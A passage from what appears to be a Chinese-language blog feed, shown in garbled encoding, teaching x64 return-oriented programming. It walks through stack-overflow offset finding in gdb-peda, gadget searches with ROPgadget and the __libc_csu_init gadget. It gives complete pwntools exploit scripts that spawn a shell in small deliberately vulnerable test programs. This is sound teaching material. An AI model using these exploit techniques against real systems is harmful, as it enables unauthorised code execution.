å¦‚ï¼š
struct sample_struct
{
char csName[16];
int iSeq;
int iType;
};

å¯¹äºå˜é‡
struct sample_strcut stTest;

ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ¸…ç©ºstTestçš„æ–¹æ³•ï¼š
stTest.csName[0]=&apos;\0&apos;;
stTest.iSeq=0;
stTest.iType=0;

ç”¨memsetå°±éå¸¸æ–¹ä¾¿ï¼š
memset(&amp;stTest,0,sizeof(struct sample_struct));

å¦‚æœæ˜¯æ•°ç»„ï¼š
struct sample_struct TEST[10];
åˆ™
memset(TEST,0,sizeof(struct sample_struct)*10);
</code></pre>]]></content>
      <tags>
        <tag>å‡½æ•°</tag>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnå­¦ä¹ ropä¹‹x64ç¯‡</title>
    <url>/2016/11/21/pwn%D1%A7%CF%B0rop%D6%AEx64%C6%AA/</url>
    <content><![CDATA[<p>rop x64å­¦ä¹ ç¬”è®°<br><a id="more"></a></p>
<h2 id="linux-64ä¸linux-86çš„åŒºåˆ«"><a href="#linux-64ä¸linux-86çš„åŒºåˆ«" class="headerlink" title="linux_64ä¸linux_86çš„åŒºåˆ«"></a>linux_64ä¸linux_86çš„åŒºåˆ«</h2><p>linux_64ä¸linux_86çš„åŒºåˆ«ä¸»è¦æœ‰ä¸¤ç‚¹ï¼šé¦–å…ˆæ˜¯å†…å­˜åœ°å€çš„èŒƒå›´ç”±32ä½å˜æˆäº†64ä½ã€‚ä½†æ˜¯å¯ä»¥ä½¿ç”¨çš„å†…å­˜åœ°å€ä¸èƒ½å¤§äº0x00007fffffffffffï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚å…¶æ¬¡æ˜¯å‡½æ•°å‚æ•°çš„ä¼ é€’æ–¹å¼å‘ç”Ÿäº†æ”¹å˜ï¼Œx86ä¸­å‚æ•°éƒ½æ˜¯ä¿å­˜åœ¨æ ˆä¸Š,ä½†åœ¨x64ä¸­çš„å‰å…­ä¸ªå‚æ•°ä¾æ¬¡ä¿å­˜åœ¨RDI, RSI, RDX, RCX, R8å’Œ R9ä¸­ï¼Œå¦‚æœè¿˜æœ‰æ›´å¤šçš„å‚æ•°çš„è¯æ‰ä¼šä¿å­˜åœ¨æ ˆä¸Šã€‚</p>
<p>æˆ‘ä»¬è¿˜æ˜¯æ‹¿å®é™…ç¨‹åºåšä¾‹å­è¿›è¡Œè®²è§£,test.cå†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void callsystem()
{
    system(&quot;/bin/sh&quot;);
}

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
    vulnerable_function();
}
</code></pre><p>æˆ‘ä»¬æ‰“å¼€ASLRå¹¶ç”¨å¦‚ä¸‹æ–¹æ³•ç¼–è¯‘ï¼š</p>
<pre><code>$ gcc -fno-stack-protector test.c -o test3
</code></pre><p>é€šè¿‡åˆ†ææºç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æƒ³è¦è·å–è¿™ä¸ªç¨‹åºçš„shelléå¸¸ç®€å•ï¼Œåªéœ€è¦æ§åˆ¶PCæŒ‡é’ˆè·³è½¬åˆ°callsystem()è¿™ä¸ªå‡½æ•°çš„åœ°å€ä¸Šå³å¯ã€‚å› ä¸ºç¨‹åºæœ¬èº«åœ¨å†…å­˜ä¸­çš„åœ°å€ä¸æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥ä¸ç”¨æ‹…å¿ƒå‡½æ•°åœ°å€å‘ç”Ÿæ”¹å˜ã€‚æ¥ä¸‹æ¥å°±æ˜¯è¦æ‰¾æº¢å‡ºç‚¹äº†ã€‚æˆ‘ä»¬è¿˜æ˜¯ç”¨è€æ–¹æ³•ç”Ÿæˆä¸€ä¸²å®šä½å­—ç¬¦ä¸²ï¼š</p>
<pre><code>gdb-peda$ pattern create 150
&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&apos;
</code></pre><p>ç„¶årè¾“å…¥è¿™ä¸ªå­—ç¬¦ä¸²é€ æˆç¨‹åºå´©æºƒ</p>
<pre><code>gdb-peda$ r
Starting program: /home/heyuan/æ¡Œé¢/test3 
Hello, World
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA

Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]
RAX: 0x97 
RBX: 0x0 
RCX: 0x7ffff7b04680 (&lt;__read_nocancel+7&gt;:    cmp    rax,0xfffffffffffff001)
RDX: 0x200 
RSI: 0x7fffffffdc10 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n&quot;)
RDI: 0x0 
RBP: 0x6c41415041416b41 (&apos;AkAAPAAl&apos;)
RSP: 0x7fffffffdc98 (&quot;AAQAAmAARAAoAA\n&quot;)
RIP: 0x4005e7 (&lt;vulnerable_function+32&gt;:    ret)
R8 : 0x400690 (&lt;__libc_csu_fini&gt;:    repz ret)
R9 : 0x7ffff7de78e0 (&lt;_dl_fini&gt;:    push   rbp)
R10: 0x37b 
R11: 0x246 
R12: 0x4004c0 (&lt;_start&gt;:    xor    ebp,ebp)
R13: 0x7fffffffdd90 --&gt; 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4005e0 &lt;vulnerable_function+25&gt;:    call   0x400490 &lt;read@plt&gt;
   0x4005e5 &lt;vulnerable_function+30&gt;:    nop
   0x4005e6 &lt;vulnerable_function+31&gt;:    leave  
=&gt; 0x4005e7 &lt;vulnerable_function+32&gt;:    ret    
   0x4005e8 &lt;main&gt;:    push   rbp
   0x4005e9 &lt;main+1&gt;:    mov    rbp,rsp
   0x4005ec &lt;main+4&gt;:    sub    rsp,0x10
   0x4005f0 &lt;main+8&gt;:    mov    DWORD PTR [rbp-0x4],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdc98 (&quot;AAQAAmAARAAoAA\n&quot;)
0008| 0x7fffffffdca0 --&gt; 0xa41416f414152 (&apos;RAAoAA\n&apos;)
0016| 0x7fffffffdca8 --&gt; 0x100000000 
0024| 0x7fffffffdcb0 --&gt; 0x400620 (&lt;__libc_csu_init&gt;:    push   r15)
0032| 0x7fffffffdcb8 --&gt; 0x7ffff7a2e830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)
0040| 0x7fffffffdcc0 --&gt; 0x0 
0048| 0x7fffffffdcc8 --&gt; 0x7fffffffdd98 --&gt; 0x7fffffffe172 (&quot;/home/heyuan/æ¡Œé¢/test3&quot;)
0056| 0x7fffffffdcd0 --&gt; 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004005e7 in vulnerable_function ()
</code></pre><p>PCæŒ‡é’ˆå¹¶æ²¡æœ‰æŒ‡å‘ç±»ä¼¼äº0x41414141é‚£æ ·åœ°å€ï¼Œè€Œæ˜¯åœåœ¨äº†vulnerable_function()å‡½æ•°ä¸­ã€‚å°±æ˜¯å› ä¸ºæˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡çš„ç¨‹åºä½¿ç”¨çš„å†…å­˜åœ°å€ä¸èƒ½å¤§äº0x00007fffffffffffï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ä½†æ˜¯ï¼Œè™½ç„¶PCä¸èƒ½è·³è½¬åˆ°é‚£ä¸ªåœ°å€ï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥é€šè¿‡æ ˆæ¥è®¡ç®—å‡ºæº¢å‡ºç‚¹ã€‚å› ä¸ºretç›¸å½“äºâ€œpop ripâ€æŒ‡ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦çœ‹ä¸€ä¸‹æ ˆé¡¶çš„æ•°å€¼å°±èƒ½çŸ¥é“PCè·³è½¬çš„åœ°å€äº†ã€‚</p>
<pre><code>gdb-peda$ x/gx $rsp
0x7fffffffdc98:    0x41416d4141514141
</code></pre><p>åœ¨GDBé‡Œï¼Œxæ˜¯æŸ¥çœ‹å†…å­˜çš„æŒ‡ä»¤ï¼Œéšåçš„gxä»£è¡¨æ•°å€¼ç”¨64ä½16è¿›åˆ¶æ˜¾ç¤ºã€‚éšåæˆ‘ä»¬å°±å¯ä»¥ç”¨pattern.pyæ¥è®¡ç®—æº¢å‡ºç‚¹ã€‚</p>
<pre><code>gdb-peda$ pattern offset 0x41416d4141514141
4702159612987654465 found at offset: 136
</code></pre><p>å¯ä»¥çœ‹åˆ°æº¢å‡ºç‚¹ä¸º136å­—èŠ‚ã€‚æˆ‘ä»¬å†æ„é€ ä¸€æ¬¡payloadï¼Œå¹¶ä¸”è·³è½¬åˆ°ä¸€ä¸ªå°äº0x00007fffffffffffçš„åœ°å€ï¼Œçœ‹çœ‹è¿™æ¬¡èƒ½å¦æ§åˆ¶pcçš„æŒ‡é’ˆã€‚</p>
<pre><code>$ python -c &apos;print &quot;A&quot;*136+&quot;ABCDEF\x00\x00&quot;&apos; &gt; payload

gdb-peda$ r &lt; payload 
Starting program: /home/heyuan/æ¡Œé¢/test3 &lt; payload
Hello, World

Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]
RAX: 0x91 
RBX: 0x0 
RCX: 0x7ffff7b04680 (&lt;__read_nocancel+7&gt;:    cmp    rax,0xfffffffffffff001)
RDX: 0x200 
RSI: 0x7fffffffdc10 (&apos;A&apos; &lt;repeats 137 times&gt;, &quot;BCDEF&quot;)
RDI: 0x0 
RBP: 0x4141414141414141 (&apos;AAAAAAAA&apos;)
RSP: 0x7fffffffdca0 --&gt; 0x7fffffffdd0a --&gt; 0xe550000000000000 
RIP: 0x464544434241 (&apos;ABCDEF&apos;)
R8 : 0x400690 (&lt;__libc_csu_fini&gt;:    repz ret)
R9 : 0x7ffff7de78e0 (&lt;_dl_fini&gt;:    push   rbp)
R10: 0x37b 
R11: 0x246 
R12: 0x4004c0 (&lt;_start&gt;:    xor    ebp,ebp)
R13: 0x7fffffffdd90 --&gt; 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x464544434241
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdca0 --&gt; 0x7fffffffdd0a --&gt; 0xe550000000000000 
0008| 0x7fffffffdca8 --&gt; 0x100000000 
0016| 0x7fffffffdcb0 --&gt; 0x400620 (&lt;__libc_csu_init&gt;:    push   r15)
0024| 0x7fffffffdcb8 --&gt; 0x7ffff7a2e830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)
0032| 0x7fffffffdcc0 --&gt; 0x0 
0040| 0x7fffffffdcc8 --&gt; 0x7fffffffdd98 --&gt; 0x7fffffffe171 (&quot;/home/heyuan/æ¡Œé¢/test3&quot;)
0048| 0x7fffffffdcd0 --&gt; 0x100000000 
0056| 0x7fffffffdcd8 --&gt; 0x4005e8 (&lt;main&gt;:    push   rbp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000464544434241 in ?? ()
</code></pre><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æˆåŠŸçš„æ§åˆ¶äº†PCçš„æŒ‡é’ˆäº†ã€‚æ‰€ä»¥æœ€ç»ˆçš„expå¦‚ä¸‹ï¼š</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

elf = ELF(&apos;level3&apos;)

p = process(&apos;./level3&apos;)
#p = remote(&apos;127.0.0.1&apos;,10001)

callsystem = 0x0000000000400584

payload = &quot;A&quot;*136 + p64(callsystem)

p.send(payload)

p.interactive()
</code></pre><h2 id="ä½¿ç”¨å·¥å…·å¯»æ‰¾gadgets"><a href="#ä½¿ç”¨å·¥å…·å¯»æ‰¾gadgets" class="headerlink" title="ä½¿ç”¨å·¥å…·å¯»æ‰¾gadgets"></a>ä½¿ç”¨å·¥å…·å¯»æ‰¾gadgets</h2><p>æˆ‘ä»¬ä¹‹å‰æåˆ°x86ä¸­å‚æ•°éƒ½æ˜¯ä¿å­˜åœ¨æ ˆä¸Š,ä½†åœ¨x64ä¸­å‰å…­ä¸ªå‚æ•°ä¾æ¬¡ä¿å­˜åœ¨RDI, RSI, RDX, RCX, R8å’Œ R9å¯„å­˜å™¨é‡Œï¼Œå¦‚æœè¿˜æœ‰æ›´å¤šçš„å‚æ•°çš„è¯æ‰ä¼šä¿å­˜åœ¨æ ˆä¸Šã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€äº›ç±»ä¼¼äº pop rdi; ret çš„è¿™ç§gadgetã€‚å¦‚æœæ˜¯ç®€å•çš„gadgetsï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡objdumpæ¥æŸ¥æ‰¾ã€‚ä½†å½“æˆ‘ä»¬æ‰“ç®—å¯»æ‰¾ä¸€äº›å¤æ‚çš„gadgetsçš„æ—¶å€™ï¼Œè¿˜æ˜¯å€ŸåŠ©äºä¸€äº›æŸ¥æ‰¾gadgetsçš„å·¥å…·æ¯”è¾ƒæ–¹ä¾¿ã€‚æ¯”è¾ƒæœ‰åçš„å·¥å…·æœ‰ï¼š</p>
<pre><code>ROPEME: https://github.com/packz/ropeme
Ropper: https://github.com/sashs/Ropper
ROPgadget: https://github.com/JonathanSalwan/ROPgadget/tree/master
rp++: https://github.com/0vercl0k/rp
</code></pre><p>è¿™äº›å·¥å…·å¤§è‡´åŠŸèƒ½éƒ½å·®ä¸å¤šï¼Œä¸‹é¢ç»“åˆä¾‹å­è®²ä¸€ä¸‹ï¼Œç¨‹åºæºç å¦‚ä¸‹ï¼š</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;dlfcn.h&gt;
void systemaddr()
{
    void* handle = dlopen(&quot;libc.so.6&quot;, RTLD_LAZY);
    printf(&quot;%p\n&quot;,dlsym(handle,&quot;system&quot;));
    fflush(stdout);
}
void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}
int main(int argc, char** argv) {
    systemaddr();
    write(1, &quot;Hello, World\n&quot;, 13);
    vulnerable_function();
}
</code></pre><p>ç¼–è¯‘ï¼š</p>
<pre><code>gcc -fno-stack-protector test4.c -o test4 -ldl
</code></pre><p>é¦–å…ˆç›®æ ‡ç¨‹åºä¼šæ‰“å°system()åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œè¿™æ ·çš„è¯å°±ä¸éœ€è¦æˆ‘ä»¬è€ƒè™‘ASLRçš„é—®é¢˜äº†ï¼Œåªéœ€è¦æƒ³åŠæ³•è§¦å‘buffer overflowç„¶ååˆ©ç”¨ROPæ‰§è¡Œ system(â€œ/bin/shâ€) ã€‚ä½†ä¸ºäº†è°ƒç”¨ system(â€œ/bin/shâ€) ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªgadgetå°†rdiçš„å€¼æŒ‡å‘â€œ/bin/shâ€çš„åœ°å€ã€‚äºæ˜¯æˆ‘ä»¬ä½¿ç”¨ROPGadgetæœç´¢ä¸€ä¸‹test4ä¸­æ‰€æœ‰pop retçš„gadgetsã€‚</p>
<pre><code>$ ROPgadget --binary test4 --only &quot;pop|ret&quot; 
Gadgets information
============================================================
0x00000000004008ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004008ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004008b0 : pop r14 ; pop r15 ; ret
0x00000000004008b2 : pop r15 ; ret
0x00000000004008ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004008af : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400700 : pop rbp ; ret
0x00000000004008b3 : pop rdi ; ret
0x00000000004008b1 : pop rsi ; pop r15 ; ret
0x00000000004008ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400601 : ret
0x0000000000400682 : ret 0x2009
</code></pre><p>æˆ‘ä»¬æˆåŠŸçš„æ‰¾åˆ°äº†â€œpop rdi; retâ€è¿™ä¸ªgadgetäº†ã€‚ä¹Ÿå°±å¯ä»¥æ„é€ æˆ‘ä»¬çš„ROPé“¾äº†ã€‚</p>
<pre><code>payload = &quot;\x00&quot;*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)
</code></pre><p>å¦å¤–ï¼Œå› ä¸ºæˆ‘ä»¬åªéœ€è°ƒç”¨ä¸€æ¬¡system()å‡½æ•°å°±å¯ä»¥è·å–shellï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥æœç´¢ä¸å¸¦retçš„gadgetsæ¥æ„é€ ROPé“¾ã€‚</p>
<pre><code>ROPgadget --binary libc.so --only &quot;pop|call&quot; | grep rdi
0x0000000000195eab : call qword ptr [rdi + rbp*2 - 0x745c0000]
0x000000000019a1e3 : call qword ptr [rdi + rbx + 2]
0x000000000007d8b0 : call qword ptr [rdi]
0x0000000000023e56 : call rdi
0x0000000000106829 : pop rax ; pop rdi ; call rax
0x000000000010682a : pop rdi ; call rax
</code></pre><p>é€šè¿‡æœç´¢ç»“æœæˆ‘ä»¬å‘ç°ï¼Œ0x0000000000106829 : pop rax ; pop rdi ; call raxä¹Ÿå¯ä»¥å®Œæˆæˆ‘ä»¬çš„ç›®æ ‡ã€‚é¦–å…ˆå°†raxèµ‹å€¼ä¸ºsystem()çš„åœ°å€ï¼Œrdièµ‹å€¼ä¸ºâ€œ/bin/shâ€çš„åœ°å€ï¼Œæœ€åå†è°ƒç”¨call raxå³å¯ã€‚</p>
<pre><code>payload = &quot;\x00&quot;*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)
</code></pre><p>æ‰€ä»¥è¯´è¿™ä¸¤ä¸ªROPé“¾éƒ½å¯ä»¥å®Œæˆæˆ‘ä»¬çš„ç›®æ ‡ï¼Œéšä¾¿é€‰æ‹©ä¸€ä¸ªè¿›è¡Œæ”»å‡»å³å¯ã€‚æœ€ç»ˆexpå¦‚ä¸‹ï¼š</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

libc = ELF(&apos;libc.so&apos;)

p = process(&apos;./test4&apos;)
#p = remote(&apos;127.0.0.1&apos;,10001)

binsh_addr_offset = next(libc.search(&apos;/bin/sh&apos;)) -libc.symbols[&apos;system&apos;]
print &quot;binsh_addr_offset = &quot; + hex(binsh_addr_offset)

#pop_ret_offset = 0x0000000000022a12 - libc.symbols[&apos;system&apos;]
#print &quot;pop_ret_offset = &quot; + hex(pop_ret_offset)

pop_pop_call_offset = 0x0000000000106829 - libc.symbols[&apos;system&apos;]
print &quot;pop_pop_call_offset = &quot; + hex(pop_pop_call_offset)

print &quot;\n##########receiving system addr##########\n&quot;
system_addr_str = p.recvuntil(&apos;\n&apos;)
system_addr = int(system_addr_str,16)
print &quot;system_addr = &quot; + hex(system_addr)

binsh_addr = system_addr + binsh_addr_offset
print &quot;binsh_addr = &quot; + hex(binsh_addr)


#pop_ret_addr = system_addr + pop_ret_offset
#print &quot;pop_ret_addr = &quot; + hex(pop_ret_addr)

pop_pop_call_addr = system_addr + pop_pop_call_offset
print &quot;pop_pop_call_addr = &quot; + hex(pop_pop_call_addr)

p.recv()

#payload = &quot;\x00&quot;*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr) 

payload = &quot;\x00&quot;*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr) 

print &quot;\n##########sending payload##########\n&quot;
p.send(payload)

p.interactive()
</code></pre><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p>
<pre><code>python test4.py 
[*] &apos;/home/heyuan/\xe6\xa1\x8c\xe9\x9d\xa2/libc.so&apos;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process &apos;./test4&apos;: Done
binsh_addr_offset = 0x146de7
pop_pop_call_offset = 0xc1499

##########receiving system addr##########

system_addr = 0x7f17c39f1390
binsh_addr = 0x7f17c3b38177
pop_pop_call_addr = 0x7f17c3ab2829

##########sending payload##########

[*] Switching to interactive mode
$ id
uid=1000(heyuan) gid=1000(heyuan) ç»„=1000(heyuan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),130(wireshark)
</code></pre><h2 id="é€šç”¨gadgets"><a href="#é€šç”¨gadgets" class="headerlink" title="é€šç”¨gadgets"></a>é€šç”¨gadgets</h2><p>å› ä¸ºç¨‹åºåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ä¼šåŠ å…¥ä¸€äº›é€šç”¨å‡½æ•°ç”¨æ¥è¿›è¡Œåˆå§‹åŒ–æ“ä½œï¼ˆæ¯”å¦‚åŠ è½½libc.soçš„åˆå§‹åŒ–å‡½æ•°ï¼‰ï¼Œæ‰€ä»¥è™½ç„¶å¾ˆå¤šç¨‹åºçš„æºç ä¸åŒï¼Œä½†æ˜¯åˆå§‹åŒ–çš„è¿‡ç¨‹æ˜¯ç›¸åŒçš„ï¼Œå› æ­¤é’ˆå¯¹è¿™äº›åˆå§‹åŒ–å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æå–ä¸€äº›é€šç”¨çš„gadgetsåŠ ä»¥ä½¿ç”¨ï¼Œä»è€Œè¾¾åˆ°æˆ‘ä»¬æƒ³è¦è¾¾åˆ°çš„æ•ˆæœã€‚</p>
<p>ç›®æ ‡ç¨‹åºtest5.cæºç å¦‚ä¸‹ï¼š</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
    vulnerable_function();
}
</code></pre><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªç¨‹åºä»…ä»…åªæœ‰ä¸€ä¸ªbuffer overflowï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•çš„è¾…åŠ©å‡½æ•°å¯ä»¥ä½¿ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆæƒ³åŠæ³•æ³„éœ²å†…å­˜ä¿¡æ¯ï¼Œæ‰¾åˆ°system()çš„å€¼ï¼Œç„¶åå†ä¼ é€’â€œ/bin/shâ€åˆ°.bssæ®µ, æœ€åè°ƒç”¨system(â€œ/bin/shâ€)ã€‚å› ä¸ºåŸç¨‹åºä½¿ç”¨äº†write()å’Œread()å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡write()å»è¾“å‡ºwrite.gotçš„åœ°å€ï¼Œä»è€Œè®¡ç®—å‡ºlibc.soåœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚ä½†é—®é¢˜åœ¨äºwrite()çš„å‚æ•°åº”è¯¥å¦‚ä½•ä¼ é€’ï¼Œå› ä¸ºx64ä¸‹å‰6ä¸ªå‚æ•°ä¸æ˜¯ä¿å­˜åœ¨æ ˆä¸­ï¼Œè€Œæ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ å€¼ã€‚æˆ‘ä»¬ä½¿ç”¨ROPgadgetå¹¶æ²¡æœ‰æ‰¾åˆ°ç±»ä¼¼äºpop rdi, ret,pop rsi, retè¿™æ ·çš„gadgetsã€‚é‚£åº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿå…¶å®åœ¨x64ä¸‹æœ‰ä¸€äº›ä¸‡èƒ½çš„gadgetså¯ä»¥åˆ©ç”¨ã€‚æ¯”å¦‚è¯´æˆ‘ä»¬ç”¨objdump -d ./test<br>5è§‚å¯Ÿä¸€ä¸‹__libc_csu_init()è¿™ä¸ªå‡½æ•°ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œåªè¦ç¨‹åºè°ƒç”¨äº†libc.soï¼Œç¨‹åºéƒ½ä¼šæœ‰è¿™ä¸ªå‡½æ•°ç”¨æ¥å¯¹libcè¿›è¡Œåˆå§‹åŒ–æ“ä½œã€‚</p>
<pre><code>00000000004005a0 &lt;__libc_csu_init&gt;:
  4005a0:   48 89 6c 24 d8          mov    %rbp,-0x28(%rsp)
  4005a5:   4c 89 64 24 e0          mov    %r12,-0x20(%rsp)
  4005aa:   48 8d 2d 73 08 20 00    lea    0x200873(%rip),%rbp        # 600e24 &lt;__init_array_end&gt;
  4005b1:   4c 8d 25 6c 08 20 00    lea    0x20086c(%rip),%r12        # 600e24 &lt;__init_array_end&gt;
  4005b8:   4c 89 6c 24 e8          mov    %r13,-0x18(%rsp)
  4005bd:   4c 89 74 24 f0          mov    %r14,-0x10(%rsp)
  4005c2:   4c 89 7c 24 f8          mov    %r15,-0x8(%rsp)
  4005c7:   48 89 5c 24 d0          mov    %rbx,-0x30(%rsp)
  4005cc:   48 83 ec 38             sub    $0x38,%rsp
  4005d0:   4c 29 e5                sub    %r12,%rbp
  4005d3:   41 89 fd                mov    %edi,%r13d
  4005d6:   49 89 f6                mov    %rsi,%r14
  4005d9:   48 c1 fd 03             sar    $0x3,%rbp
  4005dd:   49 89 d7                mov    %rdx,%r15
  4005e0:   e8 1b fe ff ff          callq  400400 &lt;_init&gt;
  4005e5:   48 85 ed                test   %rbp,%rbp
  4005e8:   74 1c                   je     400606 &lt;__libc_csu_init+0x66&gt;
  4005ea:   31 db                   xor    %ebx,%ebx
  4005ec:   0f 1f 40 00             nopl   0x0(%rax)
  4005f0:   4c 89 fa                mov    %r15,%rdx
  4005f3:   4c 89 f6                mov    %r14,%rsi
  4005f6:   44 89 ef                mov    %r13d,%edi
  4005f9:   41 ff 14 dc             callq  *(%r12,%rbx,8)
  4005fd:   48 83 c3 01             add    $0x1,%rbx
  400601:   48 39 eb                cmp    %rbp,%rbx
  400604:   75 ea                   jne    4005f0 &lt;__libc_csu_init+0x50&gt;
  400606:   48 8b 5c 24 08          mov    0x8(%rsp),%rbx
  40060b:   48 8b 6c 24 10          mov    0x10(%rsp),%rbp
  400610:   4c 8b 64 24 18          mov    0x18(%rsp),%r12
  400615:   4c 8b 6c 24 20          mov    0x20(%rsp),%r13
  40061a:   4c 8b 74 24 28          mov    0x28(%rsp),%r14
  40061f:   4c 8b 7c 24 30          mov    0x30(%rsp),%r15
  400624:   48 83 c4 38             add    $0x38,%rsp
  400628:   c3                      retq   
</code></pre><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åˆ©ç”¨0x400606å¤„çš„ä»£ç æˆ‘ä»¬å¯ä»¥æ§åˆ¶rbx,rbp,r12,r13,r14å’Œr15çš„å€¼ï¼Œéšååˆ©ç”¨0x4005f0å¤„çš„ä»£ç æˆ‘ä»¬å°†r15çš„å€¼èµ‹å€¼ç»™rdx, r14çš„å€¼èµ‹å€¼ç»™rsi,r13çš„å€¼èµ‹å€¼ç»™ediï¼Œéšåå°±ä¼šè°ƒç”¨call qword ptr [r12+rbx<em>8]ã€‚è¿™æ—¶å€™æˆ‘ä»¬åªè¦å†å°†rbxçš„å€¼èµ‹å€¼ä¸º0ï¼Œå†é€šè¿‡ç²¾å¿ƒæ„é€ æ ˆä¸Šçš„æ•°æ®ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶pcå»è°ƒç”¨æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„å‡½æ•°äº†ï¼ˆæ¯”å¦‚è¯´writeå‡½æ•°ï¼‰ã€‚æ‰§è¡Œå®Œcall qword ptr [r12+rbx</em>8]ä¹‹åï¼Œç¨‹åºä¼šå¯¹rbx+=1ï¼Œç„¶åå¯¹æ¯”rbpå’Œrbxçš„å€¼ï¼Œå¦‚æœç›¸ç­‰å°±ä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œå¹¶retåˆ°æˆ‘ä»¬æƒ³è¦ç»§ç»­æ‰§è¡Œçš„åœ°å€ã€‚æ‰€ä»¥ä¸ºäº†è®©rbpå’Œrbxçš„å€¼ç›¸ç­‰ï¼Œæˆ‘ä»¬å¯ä»¥å°†rbpçš„å€¼è®¾ç½®ä¸º1ï¼Œå› ä¸ºä¹‹å‰å·²ç»å°†rbxçš„å€¼è®¾ç½®ä¸º0äº†ã€‚å¤§æ¦‚æ€è·¯å°±æ˜¯è¿™æ ·ï¼Œæˆ‘ä»¬ä¸‹æ¥æ„é€ ROPé“¾ã€‚</p>
